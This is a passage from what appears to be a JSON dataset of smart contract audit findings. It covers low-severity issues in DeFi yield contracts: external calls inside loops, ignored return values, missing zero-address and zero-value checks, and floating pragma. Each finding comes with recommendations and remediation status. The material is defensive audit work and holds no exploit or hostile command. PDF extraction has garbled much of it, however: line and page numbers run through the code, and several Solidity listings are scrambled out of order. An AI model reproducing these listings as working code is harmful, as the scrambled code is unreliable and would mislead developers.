UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : integrationMap . getTokenAddress ( tokenId ) != baseStablecoinAddress ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #134) 142 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #135) 143 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : tokenBalance = token . balanceOf ( address ( this )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #139) 144 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : baseStablecoinAmount = uniswapIntegration . 65 getTokenValueInBaseStablecoin ( tokenAddress , tokenDesiredAmounts [ tokenId ] - tokenBalance ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #142 -146) 145 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : baseStablecoinAmount > IERC20MetadataUpgradeable ( baseStablecoinAddress ). balanceOf ( address ( this )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #148 -151) 146 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : baseStablecoinAmount = IERC20MetadataUpgradeable ( baseStablecoinAddress ). balanceOf ( address ( this )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #153 -155) 147 UniswapIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #121 -171) has external calls inside a loop : uniswapTrader . swapExactInput ( baseStablecoinAddress , tokenAddress , address ( this ) , baseStablecoinAmount ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #162 -167) 148 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : uniswapIntegration . getPositionBaseStablecoinValue ( liquidityPositionIndex ) + uniswapIntegration . getTokenValueInBaseStablecoin ( tokenAddress , token . balanceOf ( address ( this )) ) <= withdrawalAmountInBaseStablecoinValue ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #308 -315) 149 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionIndex , uniswapIntegration . getPositionBaseStablecoinValue ( liquidityPositionIndex )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #318 -323) 150 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #325) 66 151 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : liquidityPositionIndex == uniswapIntegration . getLiquidityPositionsCount () - 1 ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #362 -363) 152 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionIndex ,(102 * ( withdrawalAmountInBaseStablecoinValue - uniswapIntegration . getTokenValueInBaseStablecoin ( tokenAddress , token . balanceOf ( address ( this )) ))) / 100) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #330 -338) 153 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #342) 154 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionIndex , uniswapIntegration . getPositionBaseStablecoinValue ( liquidityPositionIndex )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #347 -352) 155 UniswapIntegrationDeployer . closePositionsForWithdrawal ( address , uint256 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #294 -371) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #354) 156 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : liquidityPositionIndex < uniswapIntegration . getLiquidityPositionsCount () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #508) 157 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : ( token0 , token1 , minted , liquidityPositionId ) = uniswapIntegration . getLiquidityPosition ( liquidityPositionIndex ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #511 -520) 67 158 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : token0Id = integrationMap . getTokenId ( token0 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #522) 159 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : token1Id = integrationMap . getTokenId ( token1 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #523) 160 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #546) 161 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : tokenAddress == baseStablecoinAddress || IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . getTokenPairPoolsLength ( tokenAddress , baseStablecoinAddress ) > 0 ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #550 -553) 162 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : tokenBalanceBaseStablecoinValue = uniswapIntegration . getTokenValueInBaseStablecoin ( tokenAddress , uniswapIntegration . getBalance ( tokenAddress )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #555 -559) 163 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( tokenAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , tokensHarvestedYield [ tokenId ]) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #566 -569) 164 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( tokenAddress , baseStablecoinAddress , address ( this ) , tokensHarvestedYield [ tokenId ]) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #570 -576) 165 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has 68 external calls inside a loop : tokenAddress_scope_1 = integrationMap . getTokenAddress ( tokenId_scope_0 ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #590) 166 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( baseStablecoinAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , baseStablecoinAmount ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #597 -600) 167 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( baseStablecoinAddress , tokenAddress_scope_1 , moduleMap . getModuleAddress ( Modules . YieldManager ) , baseStablecoinAmount ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #602 -608) 168 UniswapIntegrationDeployer . harvestYield () ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #491 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( baseStablecoinAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . YieldManager ) , baseStablecoinAmount ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #610 -613) 169 YearnIntegration . deploy () ( contracts / yield - integrations / YearnIntegration . sol #101 -124) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / yield - integrations / YearnIntegration . sol #108 -110) 170 YearnIntegration . deploy () ( contracts / yield - integrations / YearnIntegration . sol #101 -124) has external calls inside a loop : tokenAmount = token . balanceOf ( address ( this )) ( contracts / yield - integrations / YearnIntegration . sol #111) 171 YearnIntegration . deploy () ( contracts / yield - integrations / YearnIntegration . sol #101 -124) has external calls inside a loop : token . allowance ( address ( this ) , vaultAddress ) == 0 ( contracts / yield - integrations / YearnIntegration . sol #116) 172 YearnIntegration . deploy () ( contracts / yield - integrations / YearnIntegration . sol #101 -124) has external calls inside a loop : IYearnVault ( vaultAddress ). deposit ( tokenAmount , address ( this )) ( contracts / yield - integrations / YearnIntegration . sol #121 -123) 173 YearnIntegration . harvestYield () ( contracts / yield - integrations / YearnIntegration . sol #130 -166) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / yield - integrations / 69 YearnIntegration . sol #137 -139) 174 YearnIntegration . harvestYield () ( contracts / yield - integrations / YearnIntegration . sol #130 -166) has external calls inside a loop : balanceBefore = token . balanceOf ( address ( this )) ( contracts / yield - integrations / YearnIntegration . sol #148 -149) 175 YearnIntegration . harvestYield () ( contracts / yield - integrations / YearnIntegration . sol #130 -166) has external calls inside a loop : IYearnVault ( getVaultAddress ( address ( token )) ). withdraw ( availableYieldInShares ) ( contracts / yield - integrations / YearnIntegration . sol #151 -164) 176 YearnIntegration . harvestYield () ( contracts / yield - integrations / YearnIntegration . sol #130 -166) has external calls inside a loop : harvestedAmount = token . balanceOf ( address ( this )) - balanceBefore ( contracts / yield - integrations / YearnIntegration . sol #154 -157) 177 YearnIntegration . harvestYield () ( contracts / yield - integrations / YearnIntegration . sol #130 -166) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . YieldManager ) , harvestedAmount ) ( contracts / yield - integrations / YearnIntegration . sol #160 -163) Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it later. 70 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the project there are many instances where external methods are being called and return values are being ignored. Code Location: Listing 25: Kernel.sol (Lines 475) function withdraw ( address [] memory tokens , uint256 [] memory amounts , bool withdrawWethAsEth ) external { uint256 ethWithdrawn = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). withdraw ( msg . sender , tokens , amounts , withdrawWethAsEth ); if ( ethWithdrawn > 0) { IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( ethWithdrawn ); payable ( msg . sender ). transfer ( ethWithdrawn ); } emit Withdraw ( msg . sender , tokens , amounts , ethWithdrawn ); } 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 71 Listing 26: Kernel.sol (Lines 510) 488 function withdrawAllAndClaim ( address [] memory tokens , bool withdrawWethAsEth ) external returns ( uint256 [] memory tokenAmounts , uint256 ethWithdrawn , uint256 ethClaimed , uint256 biosClaimed ) { ( tokenAmounts , ethWithdrawn , ethClaimed , biosClaimed ) = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). withdrawAllAndClaim ( msg . sender , tokens , withdrawWethAsEth ); if ( ethWithdrawn > 0) { IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( ethWithdrawn ); } if ( ethWithdrawn + ethClaimed > 0) { payable ( msg . sender ). transfer ( ethWithdrawn + ethClaimed ); } 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 Listing 27: Kernel.sol (Lines 532) function claimEthRewards () public returns ( uint256 ethClaimed ) { ethClaimed = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). claimEthRewards ( msg . sender ); payable ( msg . sender ). transfer ( ethClaimed ); emit ClaimEthRewards ( msg . sender , ethClaimed ); } 526 527 528 529 530 531 532 533 534 535 536 72 Listing 28: YieldManager.sol (Lines 351) 318 function distributeEth () external override onlyController { 319 IIntegrationMap integrationMap = IIntegrationMap ( 320 321 322 ); address wethAddress = IIntegrationMap ( integrationMap ). moduleMap . getModuleAddress ( Modules . IntegrationMap ) 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 getWethTokenAddress () ; // First fill up gas wallet with ETH ethToGasAccount () ; uint256 wethToDistribute = IERC20MetadataUpgradeable ( wethAddress ). balanceOf ( address ( this ) ); if ( wethToDistribute > 0) { uint256 biosBuyBackWethAmount = ( wethToDistribute * biosBuyBackEthWeight ) / getEthWeightSum () ; uint256 treasuryWethAmount = ( wethToDistribute * treasuryEthWeight ) / getEthWeightSum () ; uint256 protocolFeeWethAmount = ( wethToDistribute * protocolFeeEthWeight ) / getEthWeightSum () ; uint256 rewardsWethAmount = wethToDistribute - biosBuyBackWethAmount - treasuryWethAmount - protocolFeeWethAmount ; // Send WETH to SushiSwap trader for BIOS buy back IERC20MetadataUpgradeable ( wethAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . SushiSwapTrader ) , biosBuyBackWethAmount ); // Swap WETH for ETH and transfer to the treasury account IWeth9 ( wethAddress ). withdraw ( treasuryWethAmount ); payable ( treasuryAccount ). transfer ( treasuryWethAmount ); // Send ETH to protocol fee accrual rewards ( BIOS stakers ) ethToProtocolFeeAccrual ( protocolFeeWethAmount ); // Send ETH to token rewards ethToRewards ( rewardsWethAmount ); 73 } } 358 359 360 74 Listing 29: YieldManager.sol (Lines 382,390) address wethAddress = IIntegrationMap ( 362 function ethToGasAccount () private { 363 364 365 366 ). getWethTokenAddress () ; uint256 wethBalance = IERC20MetadataUpgradeable ( wethAddress ). moduleMap . getModuleAddress ( Modules . IntegrationMap ) balanceOf ( address ( this ) ); if ( wethBalance > 0) { uint256 gasAccountActualEthBalance = gasAccount . balance ; if ( gasAccountActualEthBalance < gasAccountTargetEthBalance ) { // Need to send ETH to gas account uint256 ethAmountToGasAccount ; if ( wethBalance < gasAccountTargetEthBalance - gasAccountActualEthBalance ) { // Send all of WETH to gas wallet ethAmountToGasAccount = wethBalance ; IWeth9 ( wethAddress ). withdraw ( ethAmountToGasAccount ); gasAccount . transfer ( ethAmountToGasAccount ); } else { // Send portion of WETH to gas wallet ethAmountToGasAccount = gasAccountTargetEthBalance - gasAccountActualEthBalance ; IWeth9 ( wethAddress ). withdraw ( ethAmountToGasAccount ); gasAccount . transfer ( ethAmountToGasAccount ); } } } } 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 75 Listing 30: YieldManager.sol (Lines 449) 416 function ethToRewards ( uint256 ethRewardsAmount ) private { 417 418 419 420 uint256 processedWethByTokenSum = getProcessedWethSum () ; require ( processedWethByTokenSum > 0, \" YieldManager :: ethToRewards : No processed WETH to distribute \" ); IIntegrationMap integrationMap = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap ) ); address wethAddress = integrationMap . getWethTokenAddress () ; uint256 tokenCount = integrationMap . getTokenAddressesLength () ; for ( uint256 tokenId ; tokenId < tokenCount ; tokenId ++) { address tokenAddress = integrationMap . getTokenAddress ( tokenId ); if ( processedWethByToken [ tokenAddress ] > 0) { IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( tokenAddress , ( ethRewardsAmount * processedWethByToken [ tokenAddress ]) / processedWethByTokenSum ); processedWethByToken [ tokenAddress ] = 0; } } lastEthRewardsAmount = ethRewardsAmount ; IWeth9 ( wethAddress ). withdraw ( ethRewardsAmount ); payable ( moduleMap . getModuleAddress ( Modules . Kernel )) . transfer ( ethRewardsAmount ); 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 76 Listing 31: YieldManager.sol (Lines 477,482) 456 function ethToProtocolFeeAccrual ( uint256 protocolFeeEthRewardsAmount ) private { IIntegrationMap integrationMap = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap ) ); address biosAddress = integrationMap . getBiosTokenAddress () ; address wethAddress = integrationMap . getWethTokenAddress () ; if ( IStrategyMap ( moduleMap . getModuleAddress ( Modules . StrategyMap ) ) . getTokenTotalBalance ( biosAddress ) > 0 ) { // BIOS has been deposited , increase Ether rewards for BIOS depositors IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( biosAddress , protocolFeeEthRewardsAmount ); IWeth9 ( wethAddress ). withdraw ( protocolFeeEthRewardsAmount ); payable ( moduleMap . getModuleAddress ( Modules . Kernel )) . transfer ( protocolFeeEthRewardsAmount ); } else { // No BIOS has been deposited , send WETH back to Kernel as reserves IERC20MetadataUpgradeable ( wethAddress ). transfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , protocolFeeEthRewardsAmount ); } } 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 77 Listing 32: YearnIntegration.sol (Lines 122) for ( uint256 tokenId = 0; tokenId < tokenCount ; tokenId ++) { IERC20MetadataUpgradeable token = IERC20MetadataUpgradeable ( ); uint256 tokenCount = integrationMap . getTokenAddressesLength () ; moduleMap . getModuleAddress ( Modules . IntegrationMap ) IIntegrationMap integrationMap = IIntegrationMap ( integrationMap . getTokenAddress ( tokenId ) 101 function deploy () external override onlyController { 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 // Check if a vault for this token exists if ( vaultAddress != address (0) ) { if ( tokenAmount > 0) { try } ); uint256 tokenAmount = token . balanceOf ( address ( this )) ; address vaultAddress = getVaultAddress ( address ( token )) ; if ( token . allowance ( address ( this ) , vaultAddress ) == 0) { token . safeApprove ( vaultAddress , type ( uint256 ). max ); IYearnVault ( vaultAddress ). deposit ( tokenAmount , address ( this )) {} catch {} 123 124 125 126 127 128 } } } } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 78 Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 79 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Lack of zero address validation has been found at many instances in YieldManager.sol, UniswapIntegration.sol, when assigning user supplied address values to state variables directly. Code Location: Listing 33: IntegrationMap.sol (Lines 64) address tokenAddress , bool acceptingDeposits , bool acceptingWithdrawals , uint256 biosRewardWeight , uint256 reserveRatioNumerator 63 function _addToken ( 64 65 66 67 68 69 70 71 72 73 74 75 76 ) internal { require ( ); require ( ! tokens [ tokenAddress ]. added , \" IntegrationMap :: addToken : Token already added \" reserveRatioNumerator <= RESERVE_RATIO_DENOMINATOR , \" IntegrationMap :: addToken : reserveRatioNumerator must be less than or equal to reserve ratio denominator \" 77 78 79 80 81 82 83 84 85 86 87 ); tokens [ tokenAddress ]. id = tokenAddresses . length ; tokens [ tokenAddress ]. added = true ; tokens [ tokenAddress ]. acceptingDeposits = acceptingDeposits ; tokens [ tokenAddress ]. acceptingWithdrawals = acceptingWithdrawals ; tokens [ tokenAddress ]. biosRewardWeight = biosRewardWeight ; tokens [ tokenAddress ]. reserveRatioNumerator = reserveRatioNumerator ; tokenAddresses . push ( tokenAddress ); 80 88 } Listing 34: Kernel.sol (Lines 169) 169 function addIntegration ( address contractAddress , string memory name ) external onlyRole ( MANAGER_ROLE ) IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . addIntegration ( contractAddress , name ); emit IntegrationAdded ( contractAddress , name ); 170 171 172 173 174 175 176 177 178 { } Listing 35: YieldManager.sol (Lines 109) { external override onlyController 101 function updateGasAccount ( address payable gasAccount_ ) 102 103 104 105 106 107 108 109 110 gasAccount = gasAccount_ ; } Listing 36: YieldManager.sol (Lines 120) external override onlyController 113 function updateTreasuryAccount ( address payable treasuryAccount_ ) 114 115 116 117 118 119 120 121 treasuryAccount = treasuryAccount_ ; { } 81 Listing 37: DynamicRangeOrdersIntegration.sol (Lines 74) address dynamicRangeOrdersIntegrationDeployerAddress 73 function setDynamicRangeOrdersIntegrationDeployer ( 74 75 76 77 dynamicRangeOrdersIntegrationDeployer = ) external override onlyOwner { IDynamicRangeOrdersIntegrationDeployer ( dynamicRangeOrdersIntegrationDeployerAddress 78 79 80 ); } Listing 38: DynamicRangeOrdersIntegration.sol (Lines 83) external override onlyManager 83 function setBaseStablecoin ( address baseStablecoinAddress_ ) 84 85 86 87 88 89 90 IIntegrationMap ( moduleMap . getModuleAddress ( Modules . require ( { IntegrationMap )) . getIsTokenAdded ( baseStablecoinAddress_ ) , \" DROIntegration :: setBaseStablecoin : Token has not been added to IntegrationMap \" ); require ( baseStablecoinAddress_ != baseStablecoinAddress , \" DROIntegration :: setBaseStablecoin : Address is already the base stablecoin \" ); baseStablecoinAddress = baseStablecoinAddress_ ; 91 92 93 94 95 96 97 98 99 }  DynamicRangeOrdersIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  AaveIntegration.sol  deposit -> tokenAddress 82  withdraw -> tokenAddress  SushiSwapIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  UniswapIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  YearnIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress Recommendation: Add proper address validation when every state variable assignment done from user supplied input. Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 83 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO VALUE CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are functions within the project that should have a zero value check. Code Location: Listing 39: YieldManager.sol (Lines 81) 75 function updateGasAccountTargetEthBalance ( uint256 gasAccountTargetEthBalance_ ) external override onlyController gasAccountTargetEthBalance = gasAccountTargetEthBalance_ ; 76 77 78 79 80 81 82 { } Listing 40: YieldManager.sol (Lines 212) uint256 amount , uint256 numerator , uint256 denominator 206 function _calculateReserveAmount ( 207 208 209 210 211 212 213 } ) internal pure returns ( uint256 ) { return ( amount * numerator ) / denominator ;  Also possible division by 0. 84 Listing 41: UniswapTrader.sol (Lines 213) address tokenA , address tokenB , uint256 poolIndex , uint24 slippageNumerator 209 function updatePoolSlippageNumerator ( 210 211 212 213 214 215 216 217 218 219 ) external override onlyManager { require ( slippageNumerator <= SLIPPAGE_DENOMINATOR , \" UniswapTrader : updatePoolSlippageNumerator : Slippage numerator must not be greater than slippage denominator \" ); ( address token0 , address token1 ) = getTokensSorted ( tokenA , tokenB ); require ( pools [ token0 ][ token1 ][ poolIndex ]. slippageNumerator != slippageNumerator , \" UniswapTrader : updatePoolSlippageNumerator : Slippage numerator must be updated to a new number \" ); require ( pools [ token0 ][ token1 ]. length > poolIndex , \" UniswapTrader : updatePoolSlippageNumerator : Pool does not exist \" ); pools [ token0 ][ token1 ][ poolIndex ]. slippageNumerator = slippageNumerator ; emit UniswapPoolSlippageNumeratorUpdated ( token0 , token1 , poolIndex , slippageNumerator ); } 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 85 Listing 42: IntegrationMap.sol (Lines 68) address tokenAddress , bool acceptingDeposits , bool acceptingWithdrawals , uint256 biosRewardWeight , uint256 reserveRatioNumerator 63 function _addToken ( 64 65 66 67 68 69 70 71 72 73 74 75 76 ) internal { require ( ); require ( ! tokens [ tokenAddress ]. added , \" IntegrationMap :: addToken : Token already added \" reserveRatioNumerator <= RESERVE_RATIO_DENOMINATOR , \" IntegrationMap :: addToken : reserveRatioNumerator must be less than or equal to reserve ratio denominator \" 77 78 79 80 81 82 83 84 85 86 87 88 ); tokens [ tokenAddress ]. id = tokenAddresses . length ; tokens [ tokenAddress ]. added = true ; tokens [ tokenAddress ]. acceptingDeposits = acceptingDeposits ; tokens [ tokenAddress ]. acceptingWithdrawals = acceptingWithdrawals ; tokens [ tokenAddress ]. biosRewardWeight = biosRewardWeight ; tokens [ tokenAddress ]. reserveRatioNumerator = reserveRatioNumerator ; tokenAddresses . push ( tokenAddress ); } Listing 43: UniswapIntegration.sol (Lines 206) { external override onlyController 198 function deposit ( address tokenAddress , uint256 amount ) 199 200 201 202 203 204 205 206 207 balances [ tokenAddress ] += amount ; } 86 Listing 44: DynamicRangeOrdersIntegration.sol (Lines 168) uint256 amount , uint256 numerator , uint256 denominator 158 function _calculateReserveAmount ( 159 160 161 162 163 164 165 } ) internal pure returns ( uint256 ) { return ( amount * numerator ) / denominator ; Listing 45: Kernel.sol (Lines 382) address tokenAddress , uint256 reserveRatioNumerator , bool rebalance 380 function updateTokenReserveRatioNumerator ( 381 382 383 384 385 386 387 ) external onlyRole ( MANAGER_ROLE ) { IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . updateTokenReserveRatioNumerator ( tokenAddress , reserveRatioNumerator ); if ( rebalance ) { IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager )) . rebalance () ; } emit TokenReserveRatioNumeratorUpdated ( tokenAddress , reserveRatioNumerator , rebalance ); } 388 389 390 391 392 393 394 395 396 397 398 399 400  DynamicRangeOrdersIntegration.sol  deposit -> amount  withdraw -> amount 87  AaveIntegration.sol  deposit -> amount  withdraw -> amount  SushiSwapIntegration.sol  deposit -> amount  withdraw -> amount  UniswapIntegration.sol  deposit -> amount  withdraw -> amount  YearnIntegration.sol  deposit -> amount  withdraw -> amount Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add a zero value check to ensure that those variables were not set to 0. Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 88 3.10 (HAL-10) REDUNDANT CODE - LOW ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf",
        "body": "All Smart Contracts use the floating pragma 0.6.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an updated compiler version that might introduce bugs or discovered vulnerabilities in the newest versions that affect the contract system negatively. Code Location: BSCXNTS.sol: [Line #2] Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider lock the pragma version known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Pragma can also be locked fixing the compiler version in the configuration file when you deploy contracts with truffle or hardhat frameworks. 12 ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpoolx_SmartContract",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION DEPRECATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf",
        "body": "The current version in use for the contracts is pragma 0.6.0. While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: BSCXNTS.sol: [Line #2] Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.2. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) 13 ",
        "labels": [
            "Halborn",
